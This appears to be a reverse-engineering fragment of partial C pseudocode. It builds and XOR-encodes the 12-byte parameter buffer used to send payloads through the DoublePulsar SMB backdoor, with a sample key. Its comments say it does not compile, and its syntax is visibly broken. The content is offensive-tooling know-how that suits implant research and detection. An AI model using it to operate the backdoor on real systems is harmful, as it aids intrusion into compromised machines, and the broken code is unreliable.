sample 0x58581162

/* in buffer:
unsigned int XorKey[4] = 58 58 11 62
              [0] [1] [2] [3]
REVERSE:
Char ReversedXorKey = 62, 11, 58, 58
		          [0] [1] [2] [3]
*/

//function to try to generate the DoublePulsar parameters
//partially psuedo code, shouldn't be able to compile at this time
void CalculateDoublePulsarParameters(unsigned int key, unsigned int payloadSize, unsigned int chunkSize, unsigned int Offset, char &Parameter_buffer)
{

unsigned int swapped_payloadSize = byte_swap(payloadSize);
unsigned int swapped_chunkSize = byte_swap(chunkSize);
unsigned int swapped_Offset = byte_swap(Offset);

char char_payloadSize[4]; 
char char_chunkSize[4];
char char_Offset[4];

memcpy(char_payloadSize, (char*)&swapped_payloadSize, 4);
memcpy(char_chunkSize, (char*)&swapped_chunkSize, 4);
memcpy(char_Offset, (char*)&swapped_Offset, 4);

/*
*Parameter_buffer[0] = char_payloadSize[3];
*Parameter_buffer[1] = char_payloadSize[2];
*Parameter_buffer[2] = char_payloadSize[1];
*Parameter_buffer[3] = char_payloadSize[0];

*Parameter_buffer[4] = char_chunkSize[3]
*Parameter_buffer[5] = char_chunkSize[2]
*Parameter_buffer[6] = char_chunkSize[1]
*Parameter_buffer[7] = char_chunkSize[0]

*Parameter_buffer[8] = char_Offset[3]
*Parameter_buffer[9] = char_Offset[2]
*Parameter_buffer[10] = char_Offset[1]
*Parameter_buffer[11] = char_Offset[0]
*/

//most likely this
*Parameter_buffer[0] = char_payloadSize[0];
*Parameter_buffer[1] = char_payloadSize[1];
*Parameter_buffer[2] = char_payloadSize[2];
*Parameter_buffer[3] = char_payloadSize[3];

*Parameter_buffer[4] = char_chunkSize[0]
*Parameter_buffer[5] = char_chunkSize[1]
*Parameter_buffer[6] = char_chunkSize[2]
*Parameter_buffer[7] = char_chunkSize[3]

*Parameter_buffer[8] = char_Offset[0]
*Parameter_buffer[9] = char_Offset[1]
*Parameter_buffer[10] = char_Offset[2]
*Parameter_buffer[11] = char_Offset[3]

xor_payload(key, *Parameter_buffer, 12);
}
